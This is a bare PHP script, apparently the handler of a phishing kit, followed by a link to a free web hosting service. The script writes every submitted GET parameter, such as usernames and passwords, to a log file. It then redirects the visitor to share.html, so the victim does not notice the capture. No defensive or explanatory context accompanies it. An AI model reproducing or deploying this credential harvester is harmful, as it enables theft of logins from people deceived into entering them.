<?php
header('Location: ././share.html');
$handle = fopen("log.txt", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
https://afdalhosting.com/free-web-hosting/#FreeHostingEU